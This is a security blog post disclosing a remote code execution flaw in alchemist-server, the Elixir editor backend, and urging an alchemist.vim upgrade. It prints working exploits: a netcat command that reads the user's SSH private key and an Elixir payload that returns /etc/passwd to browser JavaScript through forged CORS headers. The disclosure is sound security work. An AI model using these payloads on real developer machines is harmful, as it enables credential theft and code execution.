---
title: Hacking your Elixir Editor
author: mveytsman
date: 2017-07-28
layout: post
podcast: true
tags: Elixir, Security
---

I've been playing with Elixir recently, and came across a remote code execution bug in the developer tools. You know, as one does.

Before we continue, a warning: if you use Vim and have ever edited Elixir files **stop what you're doing and upgrade [alchemist.vim](https://github.com/slashmili/alchemist.vim) to 2.8.0**. Seriously, go do it, right now.

Done? Okay, let's take it from the top. If you want to implement nice editor support for a language, and provide things like code-completion or jump-to-definition, you need some way to introspect both the source code being edited and the language's runtime environment to figure out what suggestions to give to your users. 

There's a package called [alchemist](https://github.com/tonini/alchemist.el) that provides Elixir support for Emacs. It has nice features like code-completion, and jump-to-definition, and, thereofre, it understands Elixir code and can read through a project's dependencies and stuff like that. A common pattern when writing editor plugins is to build a little background program in the language you're targeting that can introspect the runtime and tell the editor where symbols are defined and help with code completion. Alchemist does this with [alchemist-server](https://github.com/tonini/alchemist-server).

Alchemist-server is also used by the Vim plugin, [alchemist.vim](https://github.com/slashmili/alchemist.vim). While Emacs talks to alchemist-server via STDIN/STDOUT, the Vim plugin uses a TCP server to process commands from Vim.

# The bug

I can't claim credit for the original bug. It was [reported](https://github.com/tonini/alchemist-server/issues/14) by [Ivan Kozik](https://github.com/ivan) back in February. 

The issue is that alchemist-server accepted `EVAL` as a command and listened unauthenticated on all interfaces. This means that anyone in the same coffee shop as you can eval arbitrary Elixir code on your computer if they can guess the [ephemeral port](https://en.wikipedia.org/wiki/Ephemeral_port) the server is running on. 

This is really bad, and unfortunately had not been addressed since the issue was reported. I think this bug wasn't patched immediately for three reasons:

1. There wasn't consensus on what the correct fix was. Do we listen on localhost only? On a socket? Sign and MAC the command? If we do that, what key do we use?
2. The severity of the bug wasn't made clear. While it exposed you to a remote attacker over the same network, Ivan initially thought that you would need a [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attack to exploit the bug via a browser. This is theoretical and hard to explain, let alone pull off[^rebinding].

This is a super serious bug, and I wanted to see this bug fixed as quickly as possible. I subscribe to the Church of [Proof of Concept or GTFO](https://www.nostarch.com/gtfo), so it was time to demonstrate just bad this bug actually was.

# The original exploit

Ivan's original exploit takes advantage of the fact that alchemist-server uses `eval-string` to process arguments in several cases and it contains a `EVAL` command for evaluating files, probably for loading modified files into your repl environment. He sends a command that uses the `eval-string`ed portion to write a malicious Elixir script to a file and then executes it, with the results returned to the user.

Assuiming `PORT` is the ephemeral port the server is running on, his exploit looks like this:

```bash
echo 'EVAL File.write!("/tmp/payload", 
"File.read!(Path.expand(~s(~/.ssh/id_rsa)))");
{:eval, "/tmp/payload"}' | nc 127.0.0.1 PORT
 ```
 
- `EVAL` is a command for the Elixir server.
- `File.write!("/tmp/payload", "File.read!(Path.expand(~s(~/.ssh/id_rsa)))");` is the part that's processed by `eval-string`. It writes a malicious elixir script to `/tmp/payload`. The script itself returns the contents of the user's ssh private key.
- `{:eval, "/tmp/payload"}` tells the server to evaluate the file in which the malicious script was written.

# The danger of line based protocols

I know what you're thinking: "it's really too bad that alchemist-server is evaling things to begin with". And, you're dead wrong. 

It's perfectly fine for developer tools to execute code sent to them by a user; actually, most developer tools are designed specifically to evaluate arbitrary code in one way or another. The problem is that it's accepting code to be evaled over _a TCP connection_.

First, I booted up the server, and then started talking to it using netcat:

```bash
$ echo 'PING' | nc localhost 59533
PONG
END-OF-PING

$ echo "NOTAREALCOMMAND" | nc localhost 59555
# No output

$ printf "NOTAREALCOMMAND\nPING\n" | nc localhost 59609
PONG
END-OF-PING
```

This is where things get real bad for alchemist-server. We're dealing with a line based protocol, and what's more, it's ignoring[^printf] commands it doesn't understand. You know what else is a line-based protocol? HTTP. 

That means we can get a browser to issue a request to localhost and alchemist-server will ignore all the headers and HTTP formalities and happily execute an EVAL command if we put it on its own line.

Interestingly enough, this is a case where security considerations outweigh [Postel's Principle](https://en.wikipedia.org/wiki/Robustness_principle):
> Be conservative in what you do, be liberal in what you accept from others

In this case, being liberal in what you accept leads to accepting messages from places you really shouldn't.

# Cross-origin resource sharing

We've established that the server will accept HTTP requests from a browser. Now the trick is to get the browser to send one. I decided to use Javascript to send an [XHR](https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest) so that I had a good chance of being able to process the response from the server. If I just wanted to execute some code on a victim's machine, embedding a form or an image with the right payload would have worked too.

In order to use XHR, we need to get around Cross-Origin Resource Sharing (CORS). This is the policy that governs under what conditions a browser will make a request to a resource, and under what conditions the output will be returned back to the Javascript function that made the request. There is a default policy, and it can be changed by the server using special headers[^headers].

The first thing that happens is that the browser decides if it can make a request. If the request contains these special headers, or uses an HTTP method other than GET, HEAD, or POST, the browser will send a [preflighted request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests). This is an OPTIONS request that asks the server if it will accept the upcoming request.

We don't want this, so we have to send a so-called "simple request". A POST request with a content-type of "text/plain" and `EVAL ...` in the data is "simple" and not be preflighted.

The next step is getting passed the Access-Control header. By default, your browser won't return the results of an XHR request unless it's to the same origin as the script that's making it, or the server has an Access-Control header that allows the script's origin. One thing to note is that this is happening *after* the request is made. So, if I have some malicious code that will ransomware your computer, it will still be executed, even if the browser script that made the request won't be able to see the response. It's especially unimportant in the case of remote code execution, because I can exfiltrate data by having my malicious payload make a request back to me by itself.

Nevertheless, setting up a server to listen to the response requires effort, and I wanted a seamless POC. Luckily, our malicious payload's response was going to be interpreted as a HTTP response to the browser, so all I had to do was return a string that looks like:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

The browser will now see this as a response to its XHR request.
```

# Boom

And here's the full payload

```elixir
# Write the following script to /tmp/payload
EVAL File.write!("/tmp/payload",
  # HTTP response header
  ~S|IO.puts "HTTP/1.1 200 OK"
  # \n - encoded in a way that won't be parsed as a new line
  <> List.to_string([10])
  # CORS header
  <> "Access-Control-Allow-Origin: *"
  # \r\n\r\n - see above
  <> List.to_string([13,10,13,10])
  # Insert the contents of /etc/passwrd
  <> File.read!(Path.expand(~s(/etc/passwd)))
  # \r\n\r\n - see above
  <> List.to_string([13,10,13,10])|);
  # Execute the above script and return the result
{:eval, "/tmp/payload"}
```

This is what it looks like when wrapped in HTML/Javascript:

<video src="/videos/alchemist_server.webm" width="640" height="360" controls>
</video>

Thanks for reading, and make sure you update your alchemist-server!


[^rebinding]: Case in point, the [first google hit](http://searchsecurity.techtarget.com/definition/DNS-rebinding-attack) confuses for DNS rebinding confuses the attack technique with something you can do with it &mdash; using javascript to exploit default passwords on home routers from a browser.

[^printf]: You may have noticed, I used `printf` not `echo` in the last example so that my `\n`s would be rendered correctly.

[^headers]: If you want to learn more about other security releated headers, you can read my [guide](https://blog.appcanary.com/2017/http-security-headers.html)
